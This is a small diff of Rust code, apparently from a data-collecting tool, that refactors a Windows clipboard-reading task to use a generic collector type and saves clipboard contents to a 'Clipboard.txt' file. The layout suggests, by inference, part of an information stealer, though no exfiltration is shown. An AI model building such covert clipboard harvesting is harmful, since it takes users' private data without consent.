@@ -1,6 +1,6 @@
 use crate::alloc::borrow::ToOwned;
 use alloc::string::String;
-use collector::atomic::AtomicCollector;
+use collector::Collector;
 use core::ptr::{null_mut, slice_from_raw_parts};
 use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
@@ -9,10 +9,10 @@ use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
 
 pub(super) struct ClipboardTask;
 
-impl Task for ClipboardTask {
+impl<C: Collector> Task<C> for ClipboardTask {
     parent_name!("Clipboard.txt");
-    
-    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
+
+    unsafe fn run(&self, parent: &Path, _: &C) {
         if OpenClipboard(null_mut()) == 0 {
             return;
         }
